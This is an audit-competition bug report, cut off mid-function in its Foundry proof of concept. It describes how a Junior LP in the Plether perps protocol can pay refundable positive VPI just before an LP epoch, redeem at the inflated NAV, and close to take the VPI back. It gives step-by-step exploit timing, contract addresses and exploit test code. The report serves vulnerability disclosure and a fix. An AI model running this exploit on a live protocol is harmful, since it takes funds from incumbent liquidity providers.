# \#98608 [SC-Critical] Positive VPI paid by an open position is priced into Junior NAV although the lifetime clamp returns it on that position's skew-restoring close, so a Junior LP can redeem at a self-inflated NAV and take incumbent Junior LPs' funds

**Submitted on Nov 9th 2026 at 01:29:53 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98608
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Affected contracts (in-scope commit `a82d4fef`; identical runtime code live on Arbitrum Sepolia v2.0.0)

The program states that the v2.0.0 Arbitrum Sepolia release is built from a commit whose `packages/perps/src` is identical to `a82d4fef`. I also compared the deployed runtime bytecode of the contracts below with an `a82d4fef` build, excluding immutables and metadata, and they match. The proof of concept runs in the repository's Foundry suite at the in-scope commit, with the release parameters and Pyth mocked. No in-scope contract is modified.

| Contract | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|
| `CfdEngineProtocolLens` (created by `HousePool`) | `0x82fc00d77e86c52e2480459d07ad6220f1106413` | **Root cause.** `getHousePoolInputSnapshot` prices LP entry and exit from `pool.totalAssets()`, which includes positive VPI that an open position can still take back |
| `HousePool` (`HousePoolAccountingLib`) | `0xeb5604c393843b2f3c347ec24fa9ddad6ab2131e` | **Root cause.** `buildReconcileSnapshot` is the canonical entry/exit price; `_settleLpEpoch` funds matured redemptions at it |
| `CfdEngineSettlementSidecar` | `0xd3ede337e042d5aa6ba68e03d0c885b3d4a062dc` | Books an open's positive VPI as LP revenue (`recordClaimantInflow(Revenue, CashArrived)`); pays the close-time VPI rebate out of `HousePool` |
| `CfdEnginePlanner` (`CfdEnginePlanLib`, `CloseAccountingLib`) | `0x802a0755413fb966b397155b5c5cc0198e6bed3f` | Plans the open charge, and the close rebate up to the position's own lifetime accrual (lifetime clamp) |
| `TrancheVault` (Junior) | `0x4a8b67184a1e3224c11a191cc69f22c50eef734e` | Escrows the redemption request and pays the funded USDG |
| `OrderRouter` | `0x918663d6da8cb33b325a04c4a5e8c51d42f3b444` | Public `commitOrder` / `executeOrder` / `settleLpEpoch` used by the attacker and any keeper |
| `CfdEngine` | `0xca18a6783d7542f9d2f28f4f259772b74c4d6baa` | Executes the open and close |

Release parameters used (`packages/perps/DEPLOYMENT.md` and the program page):
- risk: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, maintenance 10 bps, initial 20 bps, frozen-market 300 bps, `baseCarryBps` 500, liquidation `bountyBps` 10;
- execution fee 4 bps, LP epoch 1 hour, LP deposit cooldown 1 hour;
- Senior cap 40,000,000 USDG and 80% of the pool, both set through the 72-hour timelock;
- Senior and Junior seeds of 1 USDG each.

## Brief/Intro

A trader whose open increases the pool's skew pays a positive VPI charge. The Engine books that charge into `HousePool` cash as LP revenue straight away, so Junior NAV rises by the charge. The charge is not final, though. When the same position later closes and restores the skew, the lifetime VPI clamp rebates it up to exactly what that position paid, out of `HousePool` cash. For a trader who controls both legs, the VPI is a round trip that nets to zero.

LP pricing does not see that the cash will go back. The NAV that prices redemptions (and deposits) is pool assets minus trader claims plus the terminal price delta, and the refundable charge sits inside "pool assets". So between the open and the close, Junior NAV is overstated by the charge, and a Junior LP can create that overstatement on demand.

A Junior LP with a matured redemption opens a skew-increasing position about 90 seconds before the hourly LP epoch boundary. Any keeper then settles the epoch, which funds the redemption at the inflated Junior price. The attacker closes, the clamp returns the charge to it, and the Junior LPs who stayed absorb the rebate. The price is the same, 1.00, from start to finish; no oracle choice of any kind is involved.

Main proof of concept:
- **Pool:** 30.01M USDG of depth: Senior 10M, an incumbent Junior LP 10M, and the attacker's Junior position of 10M, which it bought at the fair price.
- **Market:** ordinary traders hold a 7.5M LONG, so organic skew is 25% of depth.
- **Attacker:** a full redemption of its Junior shares, and a 4.2955M LONG that takes net skew to 39.3% of depth (the cap is 40%).

End to end, the attacker deposits 10,000,000.00 USDG into Junior and later redeems 10,006,807.67 USDG. Its trading collateral pays 3,436.84 USDG of execution fees and carry. Its absolute result is **+3,370.83 USDG** for one cycle. A control run from the same EVM snapshot makes the same deposit and redemption without the trade and ends at −91.26 USDG, which is the ordinary Senior coupon over the period. The trade is therefore worth +3,462.09 USDG against an honest LP round trip. The incumbent Junior LP's position ends **5,180.49 USDG lower** than in the control. Three cycles in a row give the attacker an absolute **+10,121.56 USDG** and take **15,550.56 USDG** from the incumbent.

## Vulnerability Details

**Root cause.** LP entry and exit are priced from the pool's current cash, trader claims and the terminal price delta. That cash includes positive VPI charges paid by positions that are still open. The protocol's own lifetime clamp entitles those positions to a rebate of up to their whole accrued charge when they reduce skew again, and a trader that controls both legs can always do that. Pricing therefore treats as LP equity an amount that the paying position can withdraw again, and any redemption funded in between is overpaid.

### 1. A skew-increasing open pays its VPI into `HousePool` as LP revenue

`CfdEnginePlanLib.planOpen` turns the open's VPI and execution fee into `tradeCostAssets` (`CfdEnginePlanLib.sol` lines 331–333):

```solidity
delta.tradeCostAssets = openState.tradeCostAssets;
delta.marginDeltaAssets = order.marginDelta;
delta.poolRebatePayoutAssets = openState.tradeCostAssets < 0 ? uint256(-openState.tradeCostAssets) : 0;
```

`CfdEngineSettlementSidecar.executeOpen` collects it from the trader, sends the execution fee to the treasury and books the rest into the pool as claimant revenue with cash arrived (`CfdEngineSettlementSidecar.sol` lines 446–464, verbatim):

```solidity
        (int256 netMarginChange, uint256 protocolFeeCreditedAssets) = clearinghouse.applyOpenCost(
            delta.account,
            delta.marginDeltaAssets,
            delta.tradeCostAssets,
            host.pool(),
            host.protocolTreasury(),
            delta.executionFeeAssets
        );
        if (delta.tradeCostAssets > 0) {
            uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
            if (poolCashInflowAssets > 0) {
                IHousePool(host.pool())
                    .recordClaimantInflow(
                        poolCashInflowAssets,
                        IHousePool.ClaimantInflowKind.Revenue,
                        IHousePool.ClaimantInflowCashMode.CashArrived
                    );
            }
        }
```

`HousePool.totalAssets()` rises by the charge. In the proof, the attacker's 4.2955M LONG pays **13,807.50 USDG** of positive VPI into the pool. The whitepaper states the effect: "Positive VPI increases physical pool assets" (`WHITEPAPER.md` line 411).

### 2. The same position's skew-restoring close is rebated up to that charge

At close, `CloseAccountingLib.buildCloseState` prices a fresh VPI delta on the current skew. A skew-restoring close has a negative delta, a rebate. The lifetime clamp only stops the position's *lifetime* VPI going below zero (`CloseAccountingLib.sol` lines 103–118):

```solidity
state.proportionalAccrualAssets =
    (inputs.position.vpiAccrued * int256(inputs.sizeDelta)) / int256(inputs.position.size);
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
// Clamp so lifetime VPI (accrued + delta) never goes negative. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

A position that paid C at open and closes back to the original skew therefore receives a rebate of exactly C: the fresh delta is −C at unchanged depth, and the clamp caps it at −C at lower depth. `CfdEnginePlanLib._planCloseActionSettlement` turns the negative action amount into `actionRebateAssets` (lines 1041–1061). The plan pays it from pool cash free of trader claims (lines 973–977), and `CfdEngineSettlementSidecar.executeClose` moves it out of the pool (lines 621–624, verbatim):

```solidity
        if (delta.actionRebatePaidAssets > 0) {
            IHousePool(host.pool()).payOut(address(clearinghouse), delta.actionRebatePaidAssets);
            clearinghouse.settleAssets(delta.account, int256(delta.actionRebatePaidAssets));
        }
```

In the proof, the close pays **12,089.06 USDG** out of the pool to the attacker. That is the 13,807.50 USDG charge less the 1,718.44 USDG close execution fee, which the close planner nets into the rebate and leaves in the pool. The attacker's VPI round trip nets to zero, and only its two execution fees remain as cost.

### 3. LP pricing counts the refundable charge as equity

`CfdEngineProtocolLens.getHousePoolInputSnapshot` builds the LP pricing inputs from the pool's physical assets (`CfdEngineProtocolLens.sol` lines 59–73):

```solidity
ICfdEngineTypes.TerminalNavSnapshot memory terminalSnapshot = engineContract.terminalNavSnapshot();
uint256 poolAssets = engineContract.pool().totalAssets();
snapshot.physicalAssets = poolAssets;
...
snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
snapshot.traderClaimBalanceAssets = terminalSnapshot.totalTraderClaimsAssets;
```

`HousePoolAccountingLib.buildReconcileSnapshot`, "the single canonical terminal-NAV snapshot shared by LP entry and exit pricing", computes `distributable = physicalAssets + terminalDelta − traderClaims` (`HousePoolAccountingLib.sol` lines 57–78). No term subtracts the positive lifetime VPI that open positions can reclaim. `HousePool._settleLpEpoch` reconciles against that snapshot and then funds matured redemptions in `_fundRedemptionPhase` from the post-reconcile tranche principal and supply (`HousePool.sol` lines 876–888, 944–960). The specification describes this ordering: "synchronized settlement prices funded shares from the post-reconcile, pre-burn tranche snapshot" (`ACCOUNTING_SPEC.md` lines 572–573).

While the attacker's position is open, the 13,807.50 USDG charge is Junior revenue, so the Junior price is overstated by it. A redemption funded in that window takes its share of the charge in USDG.

### 4. The attacker controls both ends

The epoch boundary is public and hourly. The attacker opens its skew-increasing position shortly before the boundary of the epoch in which its own full redemption matures. Whoever settles that epoch, the protocol's keeper or anyone else, funds the redemption at the inflated price. The attacker closes immediately afterwards and receives the charge back. Its price exposure lasts about two minutes. No oracle choice is involved: the proof uses one price, 1.00, for every tick.

### Relation to documentation and published findings

- **Mechanism, not harm.** `WHITEPAPER.md` line 411 ("Positive VPI increases physical pool assets") describes the cash effect at open, for the admission predicate.
- **Anticipated VPI.** `ACCOUNTING_SPEC.md` lines 1064–1066 and `SECURITY.md` lines 870–872 say that *anticipated* VPI and its reserve do not inflate terminal `K` or symmetric LP NAV. Here the cash has already arrived, and the inflation comes from counting cash that the same position can reclaim, which these sentences do not address. They do state the intent, and that intent supports this report. `ACCOUNTING_SPEC.md` lines 1064–1066 say that "anticipated carry, VPI, fees, spreads, and other action economics stay outside terminal `K`" and that the VPI reserve "does not inflate marked LP receivables or symmetric LP NAV". Refundable positive VPI held as pool cash does inflate symmetric LP NAV until the position that paid it closes.
- **Timing.** `WHITEPAPER.md` lines 742–744 ("a matured request is priced at the valid snapshot when a permissionless caller actually settles it") accepts market timing risk. It does not cover a NAV spike the redeemer creates itself and reverses right after.
- **Lifetime clamp.** `SECURITY.md` line 1443 ("the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips") protects the trader-side VPI round trip. The comment on the clamp itself says it exists to prevent "LP sandwich attacks". The LP-side pricing of the same round trip is unprotected.
- **Not known.** None of the listed reports or known-issue sections covers positive VPI in LP pricing or VPI round trips around LP epochs. The two published VPI items about pool depth need a change of depth between the open and close; here depth is unchanged until the attacker's own redemption, after which the clamp caps the rebate at the accrual.

### Relation to the negative-VPI rebate NAV issue

This report is distinct from negative-VPI rebate NAV issue, in which a skew-reducing open's negative-VPI rebate is paid out of pool cash into a reserve that LP NAV excludes. That issue deflates NAV and is exploited with a deposit. This one inflates NAV and is exploited with a redemption, through the opposite VPI sign and a different accounting bucket.

- **The other issue's fix does not touch this one.** Its mitigation adds the aggregate negative-VPI reserve, `max(−vpiAccrued, 0)` per position, to the LP pricing snapshot. In this scenario every open position, the organic LONG and the attacker's LONG, has positive `vpiAccrued`, so `_negativeVpiReserveTarget` returns 0 (`CfdEnginePlanLib.sol` lines 48–54) and that term is 0. The PoC asserts this at every settlement: `negativeVpiReserveSeen` stays false.
- **Measured.** I applied that mitigation to a local copy of `a82d4fef` and re-ran an earlier variant of this test. The variant has the same mechanism and parameters; only the order of the attacker's deposit and the organic trade differs. Every number was unchanged to the atom (+3,473.23 USDG attacker, −5,193.43 USDG incumbent), while the other report's proof of concept stopped paying under the same patch.
- **Separate fix needed.** This issue needs its own fix, in the positive-VPI term (see Recommendation).

## Exploitation

The proof of concept uses the repository's `BasePerpTest` stack with the release risk parameters and the release Router configuration. Every LP action goes through the public `TrancheVault` / `HousePool` / `OrderRouter` entry points. Every trade goes through the public V3 `commitOrder` / `executeOrder`. Marks go through `OrderRouter.updateMarkPrice`. Prices come from the suite's Pyth mock, and no in-scope contract is modified. Each run is compared with a control branch from the same EVM snapshot, identical except that the attacker does not open and close its LONG. Every open posts 2% margin.

Main test (`test_OneCycle_RedeemAtSelfInflatedNav`):

1. An incumbent Junior LP deposits 10,000,000 USDG and a Senior LP deposits 10,000,000 USDG through the public request/settle/claim path. Ordinary traders open a 7.5M LONG, which will be 25% of final depth.
2. The attacker deposits 10,000,000 USDG into Junior at the fair price through the same public path, settled by a keeper through the Router. It waits out the 1-hour cooldown. Pool depth is now 30,014,064.50 USDG and the incumbent's Junior position is worth 10,013,925.43 USDG.
3. The attacker requests redemption of all its Junior shares. The request matures at the next epoch boundary.
4. About 90 seconds before the boundary, the attacker opens a 4,295,500 USDG LONG through the Router, taking net skew to 39.3% of depth. It pays 13,807.50 USDG of positive VPI into `HousePool`.
5. The epoch starts and a keeper calls `OrderRouter.settleLpEpoch`. The attacker's redemption is fully funded at the inflated Junior price.
6. The attacker closes its LONG. The skew-restoring close is rebated, and 12,089.06 USDG leaves the pool for the attacker: the charge less the netted close fee.
7. The attacker claims 10,006,807.67 USDG. The control run, with the same deposit and redemption but no trade, returns 9,999,908.74 USDG.
8. Result for one cycle:
   - **Absolute:** the attacker put in 10,000,000.00 USDG plus collateral. It got back 10,006,807.67 USDG and its collateral less 3,436.84 USDG of fees and carry: **+3,370.83 USDG**. The control ends at −91.26 USDG, because Junior pays the ordinary Senior coupon.
   - **Against the control:** **+3,462.09 USDG**.
   - **Incumbent Junior:** 10,008,516.62 USDG against 10,013,697.11 USDG in control, a loss of **5,180.49 USDG**.
9. Three cycles in a row (`test_ThreeCycles`): the attacker re-deposits the same 10M at the fair price each time, waits out the cooldown and repeats steps 3–7. It ends **+10,121.56 USDG** in absolute terms against −273.80 USDG in control, and the incumbent ends **15,550.56 USDG** lower than in control.

## Impact Details

Incumbent Junior LPs lose funds to an unprivileged attacker, and the attacker withdraws them as USDG.
- **The value moved.** It is the position's positive VPI charge. The attacker places it in the pool before its redemption is priced and takes it back after its redemption is paid. Its share of the charge leaves with its redemption, and the rebate is then charged to the Junior LPs who remain.
- **Principal, not only yield.** The incumbent's loss comes out of its Junior position value, and it compounds per cycle.

This is **"Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical)**. The griefing downgrade does not apply, because the attacker profits in absolute terms.

**What the attacker needs.** Let `f` be the attacker's share of Junior, `σ` the organic same-direction skew, `s` the attacker's open size and `D` the depth. Then:
- **Charge:** `C ≈ k·s·(2σ + s) / (2D)` with `k = 0.01`, up to the 40% skew cap.
- **Capture:** `f × C`.
- **Cost:** two 4 bps execution fees on `s`, plus about two minutes of carry and price exposure.

| Case (`test_Sensitivity`, same harness) | Attacker share of Junior | Organic skew | Attacker vs control / cycle | Incumbent loss / cycle |
|---|---:|---:|---:|---:|
| Main test | 50% | 25% | +3,462.09 | −5,180.49 |
| No organic skew at all | 50% | 0% | +2,150.86 (absolute +2,059.54) | −6,867.06 |
| Share sweep | 20% | 25% | −507.59 | −780.85 |
| Share sweep | 25% | 25% | +10.05 (break-even) | −1,346.25 |
| Share sweep | 30% | 25% | +568.85 | −1,959.65 |
| Share sweep | 40% | 25% | +1,850.91 | −3,378.19 |
| Share sweep | 50% | 25% | +3,462.09 | −5,180.49 |

- **No organic skew is required.** At zero organic skew the attacker profits with half of Junior. Organic same-direction skew lowers the share needed: break-even is about 25% of Junior at 25% skew and about 40% at zero skew.
- **Incumbents always lose.** They lose `f × C` minus the close fee kept by the pool, whether or not the attacker profits.
- **Redemption room.** The redemption must fit the pool's free cash and the Junior covenant. Both hold in the proof: about 18M of free cash against a 10M exit, and the covenant leaves 17.5M of Junior withdrawable.
- **Repeatable.** One cycle per deposit, activation, cooldown and redemption, about two to three hours.

**Capital and risk.** The attacker's capital is an ordinary Junior position bought at the fair price and redeemed in full, plus 2% margin on the trade. The program states: "A high capital requirement is generally not a valid reason to downgrade a report." The trade's price exposure lasts about two minutes and can be hedged off-chain. The remaining risk is that another trader reduces the skew before the close, which would turn part of the charge into genuine LP revenue.


## Recommendation

Do not price LP entry and exit with positive VPI that an open position can still reclaim through the lifetime clamp. Keep it in physical cash for solvency and payout affordability. The positive lifetime VPI of open positions is a contingent rebate liability until the position closes.

**Fix.** Maintain an aggregate of open positions' positive lifetime VPI, `Σ max(vpiAccrued, 0)`, in the Engine. Update it wherever `vpiAccrued` changes: open, increase, partial or full close, liquidation. Expose it through `CfdEngineProtocolLens.getHousePoolInputSnapshot` and subtract it from `terminalAssets` in `HousePoolAccountingLib.buildReconcileSnapshot`. When a position closes, the clamp-adjusted realized VPI leaves the aggregate. What the pool keeps becomes ordinary revenue, and what is rebated has never been priced as LP equity. Withdrawal funding keeps using physical cash minus reserves, so solvency checks do not change.

```solidity
// HousePoolAccountingLib.buildReconcileSnapshot (sketch)
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets
    + engineSnapshot.openPositivePositionVpiAssets; // refundable to open positions via the lifetime clamp
```

Add a regression test that funds a Junior redemption while a skew-increasing position is open, closes the position, and asserts that the incumbent tranche value is unchanged within rounding.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/PositiveVpiRedeemSpike.t.sol` and run from the repository root:

```bash
forge test --root packages/perps --match-contract PositiveVpiRedeemSpikePoC -vv
```

The file contains three tests:
- `test_OneCycle_RedeemAtSelfInflatedNav`: the main case, with absolute and control results;
- `test_ThreeCycles`: the main case three times in a row;
- `test_Sensitivity`: zero organic skew, and the attacker's share of Junior at 25%, 30%, 40% and 50% (plus 20%).

How it is built:
- It inherits the suite's `BasePerpTest` and overrides `_riskParams()` with the release values.
- It sets the tranche seeds to 1 USDG and puts all LP capital through public deposits.
- It applies the release Router configuration and the 40M / 80% Senior caps through the owner's 72-hour timelocked config paths.
- Prices come from the suite's `MockPyth`. There is no `vm.store`, `deal`, `etch` or `mockCall` on in-scope contracts, and time is read with `vm.getBlockTimestamp()`.
- Each case reports the attacker's **absolute** USDG result (USDG redeemed minus USDG deposited, plus the change in trading collateral) and the same quantity in a **control** branch from the same EVM snapshot. The tests assert that the absolute result is positive, that it beats the control, and that the incumbent ends lower than in the control.

The suite's Router is the repository's test harness, which only adds a legacy scalar `commitOrder` overload. The proof uses the production V3 `commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice` and `settleLpEpoch` entry points.

### Complete test:

<details>
<summary>Complete test</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice A skew-increasing open pays positive VPI into HousePool cash, which raises Junior NAV at once. The same
///         position's skew-restoring close is rebated up to its own lifetime accrual (CloseAccountingLib lifetime
///         clamp), so that cash goes straight back to the trader. A Junior holder with a matured redemption opens just
///         before the LP epoch boundary, lets any keeper settle the epoch (its redemption is funded at the inflated
///         NAV), then closes. Incumbent Junior LPs pay the rebate.
///
///         One constant price (1.00) is used throughout: no oracle tick choice is involved.
///         Public entry points only: LP capital through TrancheVault.requestDeposit / HousePool.settleLpEpoch (no open
///         positions) or OrderRouter.settleLpEpoch / TrancheVault.claimDeposit / requestRedeem / claimRedeem; trades
///         through OrderRouter.commitOrder / executeOrder; marks through OrderRouter.updateMarkPrice. Pyth (MockPyth)
///         and USDG (mock token) are the only mocks; no vm.store / deal / etch / mockCall on in-scope contracts.
///         Release parameters: DEPLOYMENT.md risk params, release Router config, 1 USDG seeds, Senior caps 40M / 80%.
contract PositiveVpiRedeemSpikePoC is BasePerpTest {

    address internal constant ORGANIC_LONG = address(0x0711);
    address internal constant ATTACKER = address(0xBADBAD);
    address internal constant INCUMBENT = address(0x1BC0);
    address internal constant SENIOR_LP = address(0x5E1105);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant SENIOR_DEPOSIT = 10_000_000e6;
    uint256 internal constant INCUMBENT_JUNIOR = 10_000_000e6;
    uint256 internal constant ATTACKER_COLLATERAL = 1_000_000e6;
    uint256 internal constant MARGIN_BPS = 200; // 2% margin on every open
    uint256 internal constant TARGET_SKEW_BPS = 3930; // the attacker tops net skew up to 39.3% of depth (cap 40%)

    uint256 internal orderNonce;
    bool internal negativeVpiReserveSeen;

    struct Run {
        uint256 attackerUsdgIn; // USDG the attacker deposited into Junior over all cycles
        uint256 attackerUsdgOut; // USDG the attacker redeemed from Junior over all cycles
        int256 collateralChange; // change of the attacker's trading collateral (fees, carry, VPI round trip)
        uint256 incumbentJuniorValue; // incumbent Junior position value at the end
        uint256 vpiCharge; // positive VPI paid into the pool by the attacker's first open
        uint256 rebate; // pool cash paid back to the attacker on its first close
    }

    struct Case {
        uint256 depth;
        uint256 attackerLongNotional;
        uint256 incumbentBefore;
        Run attack;
        Run control;
    }

    // ------------------------------------------------------------------ configuration (release values)

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0; // all LP capital enters through the public request/settle/claim path
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function setUp() public override {
        super.setUp();
        _applyReleaseRouterConfig(); // 72 h timelock
        _setSeniorCapacity(40_000_000e6, 8_000); // 72 h timelock
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(pool.maxSeniorShareBps(), 8_000, "release Senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release Senior exposure cap");
        vm.warp(SETUP_TIMESTAMP + 7 days); // Monday 10:00 UTC, live market
        _refreshMark(PRICE);
    }

    // ------------------------------------------------------------------ tests

    /// @notice Main case: attacker holds 50% of Junior, ordinary traders hold a LONG of 25% of depth.
    function test_OneCycle_RedeemAtSelfInflatedNav() external {
        Case memory c = _case(10_000_000e6, 2500, 1);
        _report("ONE CYCLE (attacker 50% of Junior, organic skew 25%)", c);

        int256 absoluteAttack = _absolute(c.attack);
        int256 absoluteControl = _absolute(c.control);
        assertGt(c.attack.vpiCharge, 0, "no positive VPI paid");
        assertGt(absoluteAttack, 0, "attacker ends with less USDG than it started with");
        assertGt(absoluteAttack, absoluteControl, "attack no better than an honest LP round trip");
        assertLt(c.attack.incumbentJuniorValue, c.control.incumbentJuniorValue, "incumbent Junior not harmed");
        assertFalse(negativeVpiReserveSeen, "a negative-VPI reserve existed at settlement");
    }

    /// @notice The same cycle three times in a row (re-deposit at fair NAV, 1 h cooldown, redeem with the trick).
    function test_ThreeCycles() external {
        Case memory c = _case(10_000_000e6, 2500, 3);
        _report("THREE CYCLES (attacker 50% of Junior, organic skew 25%)", c);
        assertGt(_absolute(c.attack), 0, "attacker ends with less USDG than it started with");
        assertGt(_absolute(c.attack), _absolute(c.control), "attack no better than an honest LP round trip");
        assertLt(c.attack.incumbentJuniorValue, c.control.incumbentJuniorValue, "incumbent Junior not harmed");
        assertFalse(negativeVpiReserveSeen, "a negative-VPI reserve existed at settlement");
    }

    /// @notice Sensitivity: zero organic skew, and the attacker's share of Junior at 25% organic skew.
    function test_Sensitivity() external {
        uint256 snap = vm.snapshotState();

        Case memory z = _case(10_000_000e6, 0, 1);
        _report("SENSITIVITY: zero organic skew, attacker 50% of Junior", z);
        assertGt(_absolute(z.attack), _absolute(z.control), "zero-organic-skew case not profitable vs control");
        assertGt(_absolute(z.attack), 0, "zero-organic-skew case loses USDG");
        vm.revertToState(snap);

        uint256[5] memory attackerJunior =
            [uint256(2_500_000e6), 3_333_334e6, 4_285_715e6, 6_666_667e6, 10_000_000e6]; // 20/25/30/40/50% of Junior
        for (uint256 i; i < attackerJunior.length; ++i) {
            snap = vm.snapshotState();
            Case memory c = _case(attackerJunior[i], 2500, 1);
            emit log_named_uint(
                "SENSITIVITY: attacker share of Junior (bps), organic skew 25%",
                attackerJunior[i] * 10_000 / (attackerJunior[i] + INCUMBENT_JUNIOR)
            );
            emit log_named_decimal_int("  attacker net vs control (USDG)", _absolute(c.attack) - _absolute(c.control), 6);
            emit log_named_decimal_int(
                "  incumbent Junior, attack minus control (USDG)",
                int256(c.attack.incumbentJuniorValue) - int256(c.control.incumbentJuniorValue),
                6
            );
            vm.revertToState(snap);
        }
        assertFalse(negativeVpiReserveSeen, "a negative-VPI reserve existed at settlement");
    }

    // ------------------------------------------------------------------ scenario

    /// @dev Builds the pool through public calls, then runs `cycles` attack cycles and the same cycles without the
    ///      trade (control) from one EVM snapshot.
    function _case(
        uint256 attackerJunior,
        uint256 organicSkewBps,
        uint256 cycles
    ) internal returns (Case memory c) {
        // Incumbent Junior and a Senior LP enter through the public async path.
        uint256 j = _requestDeposit(juniorVault, INCUMBENT, INCUMBENT_JUNIOR);
        _warpTo(juniorVault.depositEpochStart(j));
        _refreshMark(PRICE);
        pool.settleLpEpoch(0, 0); // no open positions: permissionless
        _claimDeposit(juniorVault, INCUMBENT, j);
        uint256 s = _requestDeposit(seniorVault, SENIOR_LP, SENIOR_DEPOSIT);
        _warpTo(seniorVault.depositEpochStart(s));
        _refreshMark(PRICE);
        pool.settleLpEpoch(0, 0);
        _claimDeposit(seniorVault, SENIOR_LP, s);

        // Ordinary traders hold a LONG of `organicSkewBps` of the final pool depth.
        uint256 organicSize = _lots((pool.totalAssets() + attackerJunior) * organicSkewBps / 10_000);
        if (organicSize > 0) {
            _fundTrader(ORGANIC_LONG, 1_000_000e6);
            _openOrder(ORGANIC_LONG, CfdTypes.Side.LONG, organicSize, organicSize / 1e12 * MARGIN_BPS / 10_000);
        }

        // The attacker becomes an ordinary Junior LP at the fair price, after the organic trade.
        uint256 a = _requestDeposit(juniorVault, ATTACKER, attackerJunior);
        _warpTo(juniorVault.depositEpochStart(a));
        _refreshMark(PRICE);
        _settle();
        _claimDeposit(juniorVault, ATTACKER, a);
        _fundTrader(ATTACKER, ATTACKER_COLLATERAL);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1); // LP cooldown
        _refreshMark(PRICE);

        c.depth = pool.totalAssets();
        uint256 attackerSize = _lots(c.depth * TARGET_SKEW_BPS / 10_000) - organicSize;
        c.attackerLongNotional = attackerSize / 1e12;
        c.incumbentBefore = juniorVault.convertToAssets(juniorVault.balanceOf(INCUMBENT));

        uint256 snap = vm.snapshotState();
        c.attack = _cycles(attackerJunior, attackerSize, cycles, true);
        vm.revertToState(snap);
        c.control = _cycles(attackerJunior, attackerSize, cycles, false);
    }

    function _cycles(
        uint256 attackerJunior,
        uint256 attackerSize,
        uint256 cycles,
        bool attack
    ) internal returns (Run memory r) {
        int256 collateralStart = int256(clearinghouse.balanceAssets(ATTACKER));
        r.attackerUsdgIn = attackerJunior; // the deposit made in _case
        for (uint256 i; i < cycles; ++i) {
            if (i > 0) {
                // Re-enter at the fair price with the same amount; activation, then the 1 h cooldown.
                uint256 d = _requestDeposit(juniorVault, ATTACKER, attackerJunior);
                r.attackerUsdgIn += attackerJunior;
                _warpTo(juniorVault.depositEpochStart(d));
                _refreshMark(PRICE);
                _settle();
                _claimDeposit(juniorVault, ATTACKER, d);
                vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
                _refreshMark(PRICE);
            }

            // 1. Request redemption of every Junior share for the next epoch.
            uint256 shares = juniorVault.balanceOf(ATTACKER);
            vm.prank(ATTACKER);
            uint256 rid = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
            uint256 maturity = juniorVault.depositEpochStart(rid);

            // 2. About 90 seconds before the epoch boundary, open a skew-increasing LONG (pays positive VPI).
            if (vm.getBlockTimestamp() + 90 < maturity) vm.warp(maturity - 90);
            _refreshMark(PRICE);
            if (attack) {
                uint256 poolBefore = pool.totalAssets();
                _openOrder(ATTACKER, CfdTypes.Side.LONG, attackerSize, attackerSize / 1e12 * MARGIN_BPS / 10_000);
                if (i == 0) r.vpiCharge = pool.totalAssets() - poolBefore;
            }

            // 3. The epoch starts; any keeper settles it through the Router. The redemption is funded at current NAV.
            _warpTo(maturity);
            _refreshMark(PRICE);
            if (clearinghouse.vpiRebateReserveAssets(ATTACKER) != 0) negativeVpiReserveSeen = true;
            if (clearinghouse.vpiRebateReserveAssets(ORGANIC_LONG) != 0) negativeVpiReserveSeen = true;
            _settle();
            uint256 claimable = juniorVault.claimableRedeemRequest(rid, ATTACKER);
            assertEq(claimable, shares, "redemption not fully funded");

            // 4. Close: skew-restoring, rebated up to the position's own lifetime accrual.
            if (attack) {
                uint256 poolBefore = pool.totalAssets();
                _closeOrder(ATTACKER, CfdTypes.Side.LONG);
                if (i == 0) r.rebate = poolBefore - pool.totalAssets();
            }

            // 5. Claim the funded USDG.
            uint256 before = settlementToken.balanceOf(ATTACKER);
            vm.prank(ATTACKER);
